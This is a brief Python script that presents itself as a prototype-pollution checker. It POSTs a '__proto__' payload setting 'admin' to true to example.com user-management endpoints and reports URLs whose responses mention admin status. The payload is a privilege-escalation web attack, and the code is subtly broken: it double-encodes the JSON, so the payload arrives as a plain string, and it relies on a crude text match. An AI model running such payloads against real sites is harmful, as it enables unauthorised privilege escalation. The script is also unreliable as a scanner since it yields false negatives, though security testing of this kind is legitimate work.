import requests

class PrototypePollutionChecker:
    def __init__(self):
        self.vulnerable_urls = []

    def check_vulnerability(self, url):
        payload = '{"__proto__": {"admin": true}}'
        try:
            response = requests.post(url, json=payload)
            if 'User is admin' in response.text:
                print(f"Potential Prototype Pollution vulnerability found: {url}")
                self.vulnerable_urls.append(url)
            else:
                print(f"No Prototype Pollution vulnerability found: {url}")
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")

    def check_multiple_urls(self, urls):
        for url in urls:
            self.check_vulnerability(url)

    def get_vulnerable_urls(self):
        return self.vulnerable_urls

urls_to_check = [
    'https://example.com/update_user',
    'https://example.com/delete_user',
    'https://example.com/create_user'
]

checker = PrototypePollutionChecker()
checker.check_multiple_urls(urls_to_check)

vulnerable_urls = checker.get_vulnerable_urls()
if vulnerable_urls:
    print("Detected security vulnerabilities:")
    for url in vulnerable_urls:
        print(url)
else:
    print("No security vulnerabilities detected.")
